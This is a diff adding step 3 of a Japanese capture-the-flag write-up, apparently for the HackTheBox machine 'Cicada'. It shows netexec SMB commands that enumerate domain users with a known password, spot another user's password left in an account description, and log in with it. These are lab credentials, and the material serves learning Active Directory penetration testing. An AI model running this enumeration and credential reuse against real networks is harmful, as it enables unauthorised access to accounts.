@@ -165,3 +165,28 @@ LDAP        10.129.231.149  389    CICADA-DC        Emily Oscars
 
 
 ## STEP 3
+ユーザ列挙すると、descriptionにdavid.oreliousのパスワードを確認
+```sh
+└─$ netexec smb 10.129.231.149 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users                                                                                                
+SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+SMB         10.129.231.149  445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.231.149  445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain 
+SMB         10.129.231.149  445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain 
+SMB         10.129.231.149  445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account 
+SMB         10.129.231.149  445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 0        
+SMB         10.129.231.149  445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 0        
+SMB         10.129.231.149  445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
+SMB         10.129.231.149  445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3 
+SMB         10.129.231.149  445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0        
+SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated 8 local users: CICADA
+```
+david.oreliousでログイン成功
+```sh
+└─$ netexec smb 10.129.231.149 -u david.orelious -p 'aRt$Lp#7t*VQ!3'    
+SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
+```
+
+
+## STEP 4
